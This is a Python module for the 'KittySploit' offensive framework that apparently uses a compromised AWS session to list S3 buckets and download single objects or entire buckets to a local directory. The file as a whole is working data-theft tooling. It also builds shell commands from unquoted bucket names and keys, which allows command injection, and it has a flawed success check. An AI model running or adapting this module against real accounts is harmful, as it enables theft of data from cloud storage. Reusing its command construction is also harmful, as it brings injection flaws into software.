#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import json
import os

class Module(Post):
    """Download files or buckets from S3"""
    
    __info__ = {
        "name": "Download from S3",
        "description": "Download files or entire buckets from S3",
        "author": "KittySploit Team",
        "tags": ["aws", "s3"],
        "session_type": SessionType.AWS,
    }
    
    bucket_name = OptString("", "S3 bucket name (REQUIRED)", True)
    object_key = OptString("", "Specific object key to download (downloads entire bucket if empty)", False)
    output_dir = OptString("/tmp/s3_download", "Local output directory", False)
    download_entire_bucket = OptBool(False, "Download entire bucket (can be large)", False)
    max_objects = OptInteger(1000, "Maximum objects to download (0 = unlimited)", False)
    preserve_structure = OptBool(True, "Preserve bucket directory structure", False)
    
    def run(self):
        """Run the S3 download"""
        try:
            bucket = self.bucket_name.value
            if not bucket:
                print_error("Bucket name is required")
                return False
            
            output_dir = self.output_dir.value
            object_key = self.object_key.value
            
            print_info("Starting S3 download...")
            print_info("=" * 80)
            print_info(f"Bucket: {bucket}")
            print_info(f"Output directory: {output_dir}")
            
            # Create output directory
            mkdir_cmd = f"mkdir -p {output_dir}"
            self.cmd_execute(mkdir_cmd)
            
            if object_key:
                # Download specific object
                print_info(f"\n[1] Downloading object: {object_key}")
                success = self._download_object(bucket, object_key, output_dir)
                if success:
                    print_success(f"Downloaded: {object_key}")
                    return True
                else:
                    print_error(f"Failed to download: {object_key}")
                    return False
            else:
                # Download entire bucket or list first
                if self.download_entire_bucket.value:
                    print_status("Downloading entire bucket...")
                    return self._download_bucket(bucket, output_dir, self.max_objects.value, self.preserve_structure.value)
                else:
                    print_status("Listing bucket contents (use download_entire_bucket=true to download)...")
                    objects = self._list_bucket_objects(bucket, self.max_objects.value)
                    if objects:
                        print_success(f"Found {len(objects)} objects in bucket")
                        print_status("First 20 objects:")
                        for obj in objects[:20]:
                            key = obj.get('Key', 'Unknown')
                            size = obj.get('Size', 0)
                            print_info(f"  - {key} ({size} bytes)")
                        if len(objects) > 20:
                            print_status(f"  ... and {len(objects) - 20} more")
                        print_status("Set download_entire_bucket=true to download all objects")
                    return True
            
        except Exception as e:
            print_error(f"Error during download: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def _download_object(self, bucket, object_key, output_dir):
        """Download a specific object"""
        if self.preserve_structure.value:
            # Preserve directory structure
            local_path = os.path.join(output_dir, object_key)
            local_dir = os.path.dirname(local_path)
            mkdir_cmd = f"mkdir -p {local_dir}"
            self.cmd_execute(mkdir_cmd)
        else:
            # Just filename
            filename = os.path.basename(object_key)
            local_path = os.path.join(output_dir, filename)
        
        cmd = f"aws s3 cp s3://{bucket}/{object_key} {local_path} 2>&1"
        result = self.cmd_execute(cmd)
        
        if result and 'download' in result.lower() or 'completed' in result.lower():
            return True
        return False
    
    def _download_bucket(self, bucket, output_dir, max_objects=1000, preserve_structure=True):
        """Download entire bucket"""
        sync_cmd = f"aws s3 sync s3://{bucket} {output_dir}"
        if preserve_structure:
            sync_cmd += " --exclude '*' --include '*'"
        
        print_info(f"Syncing bucket to {output_dir}...")
        result = self.cmd_execute(sync_cmd)
        
        if result:
            print_success(f"Bucket sync completed")
            # Count downloaded files
            count_cmd = f"find {output_dir} -type f | wc -l"
            count_result = self.cmd_execute(count_cmd)
            if count_result:
                print_info(f"Downloaded {count_result.strip()} files")
            return True
        else:
            print_error("Failed to sync bucket")
            return False
    
    def _list_bucket_objects(self, bucket, max_objects=1000):
        """List objects in bucket"""
        cmd = f"aws s3api list-objects-v2 --bucket {bucket} --max-items {max_objects} 2>/dev/null"
        result = self.cmd_execute(cmd)
        
        if result:
            try:
                data = json.loads(result)
                return data.get('Contents', [])
            except:
                pass
        
        # Try Python boto3
        python_cmd = f"""
python3 -c "
import boto3, json
try:
    s3 = boto3.client('s3')
    response = s3.list_objects_v2(Bucket='{bucket}', MaxKeys={max_objects})
    print(json.dumps(response.get('Contents', [])))
except Exception as e:
    print('ERROR:', str(e))
" 2>/dev/null
"""
        result = self.cmd_execute(python_cmd)
        if result and 'ERROR' not in result:
            try:
                return json.loads(result)
            except:
                pass
        return []


